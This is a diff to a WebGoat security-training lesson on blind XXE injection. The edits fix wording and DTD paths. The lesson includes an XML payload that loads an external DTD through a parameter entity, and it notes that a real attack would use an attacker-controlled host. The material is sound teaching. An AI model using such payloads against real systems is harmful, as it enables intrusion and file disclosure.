@@ -4,7 +4,7 @@ In some cases you will see no output because although your attack might have wor
 Or the resource you are trying to read contains illegal XML character which causes the parser to fail.
 Let's start with an example, in this case we reference a external DTD which we control on our own server.
 
-Our WebGoat server by default has an /xxe/ping endpoint which we can use. *This can be any server you control.*
+Our WebGoat server by default has an /xxe/ping endpoint which we can use. *This can be any server under your control.*
 
 [source]
 ----
@@ -33,7 +33,7 @@ Now submit the form and change the xml to:
 ----
 <?xml version="1.0"?>
 <!DOCTYPE root [
-<!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/plugin/XXE/attack.dtd">
+<!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/XXE/attack.dtd">
 %remote;
 ]>
 <user>
@@ -51,5 +51,5 @@ GET Java/1.8.0_101 HelloWorld
 So with the XXE we are able to ping our own server which means XXE injection is possible.
 
 [NOTE]
-In this case we use http://localhost:8080/WebGoat/plugin_lessons/plugin/XXE/test.dtd to fetch the dtd but in reality this will
+In this case we use http://localhost:8080/WebGoat/plugin_lessons/XXE/test.dtd to fetch the dtd but in reality this will
 of course be a host fully under the attackers control.
